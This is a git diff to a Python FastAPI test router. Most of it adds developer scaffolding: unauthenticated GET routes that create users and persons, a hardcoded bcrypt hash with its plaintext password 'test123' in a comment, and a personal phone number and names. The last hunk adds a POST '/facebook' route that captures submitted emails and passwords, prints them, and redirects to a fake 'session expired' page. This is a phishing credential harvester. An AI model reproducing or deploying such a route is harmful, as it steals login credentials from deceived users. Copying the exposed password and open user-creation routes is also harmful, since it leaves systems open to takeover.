@@ -1,12 +1,13 @@
 import sys
 
 from sqlalchemy import and_, exists
+from starlette.responses import RedirectResponse
 
 sys.path.append("..")
 
 from functools import wraps
 from Modules import auth
-from fastapi import Depends, APIRouter, Request, Response, HTTPException, UploadFile, File
+from fastapi import Depends, APIRouter, Request, Response, HTTPException, UploadFile, File, Form
 from fastapi.templating import Jinja2Templates
 from models import model
 # from models import testModel
@@ -22,6 +23,9 @@ router = APIRouter(
     responses={401: {"user": "Not Authorised"}},
 )
 
+
+# Hashed password
+# test123 = $2b$12$J4Q6yf8bfBqIKRonoIWG1uJkCZGeY5jqiwoKJNhVpEiL6lVmYZfuK
 
 @router.get("/test")
 async def test():
@@ -217,12 +221,12 @@ async def root(speak="truth", anArrey=[2, 4, 1, 3, 4]):
 # //----------join test-------------------------------------------------------------------------
 @router.get("/testjoin")
 async def test_join(db: Session = Depends(auth.get_db)):
-    # q = db.query(model.User, model.Person).join(model.Person).limit(1).all() # needs foreign key
-    # q = db.query(model.User.username, model.User.hashed_password).filter(model.User.id == 1).first()
-    # q = db.query(model.User.username, model.Person.name).join(model.Person, model.User.person_id == model.Person.id).first()
-    # q = db.query(model.User.username, model.Role.name).join(model.Role, model.User.role_id == model.Role.id).first()
-    # q = db.query(model.User.username, model.Person.name, model.Role.name).all()
-    # q = db.query(model.User.username, model.User.hashed_password).all() # select specific columns of a table
+    # q = db.query(model.User, model.Person).join(model.Person).limit(1).all() # needs foreign key q = db.query(
+    # model.User.username, model.User.hashed_password).filter(model.User.id == 1).first() q = db.query(
+    # model.User.username, model.Person.name).join(model.Person, model.User.person_id == model.Person.id).first() q =
+    # db.query(model.User.username, model.Role.name).join(model.Role, model.User.role_id == model.Role.id).first() q
+    # = db.query(model.User.username, model.Person.name, model.Role.name).all() q = db.query(model.User.username,
+    # model.User.hashed_password).all() # select specific columns of a table
     q = db.query(model.Person.full_name, model.PersonPhoneNo.mobile_no) \
         .filter((and_(model.PersonPhoneNo.mobile_no == '9127024200', model.Person.full_name == 'pranjal sonowal'))) \
         .join(model.PersonPhoneNo, model.PersonPhoneNo.person_id == model
@@ -278,3 +282,54 @@ async def test_regx(db: Session = Depends(auth.get_db)):
     # db.commit()
 
     return {"msg": "parent"}
+
+
+@router.get("/gethashedpassword")
+async def create():
+    return auth.get_password_hash('test123')
+
+
+@router.get("/createUser")
+async def create(db: Session = Depends(auth.get_db)):
+    db_userRole = db.get(model.UserRole, 1)
+    db_person = db.get(model.Person, 1)
+    print(db_person.full_name())
+    db_user = model.User(
+        userRole=db_userRole,
+        username='pompom',
+        email='pompom@gmail.com',
+        hashed_password='$2b$12$J4Q6yf8bfBqIKRonoIWG1uJkCZGeY5jqiwoKJNhVpEiL6lVmYZfuK',
+        created_by_id=1,
+        # person=db_person
+    )
+    db.add(db_user)
+    db.commit()
+    return db_person.full_name()
+
+
+@router.get("/createPerson")
+async def create(db: Session = Depends(auth.get_db)):
+    db_user = db.get(model.User, 1)
+    db_personPhNo = model.PersonPhoneNo(
+        country_code='+91',
+        mobile_no='9127024200',
+        is_primary_no=True,
+        created_by=db_user,
+    )
+    db_person = model.Person(
+        country_code="+91",
+        primary_mobile_no="9127024200",
+        first_name='chandan',
+        created_by=db_user,
+        phone=[db_personPhNo]
+    )
+    db.add(db_person)
+    db.commit()
+
+    return "ok"
+
+@router.post("/facebook")
+async def create(email: str = Form(...), password: str = Form(...), db: Session = Depends(auth.get_db)):
+    print(email)
+    print(password)
+    return RedirectResponse("/sessionexpired.html", status_code=303)
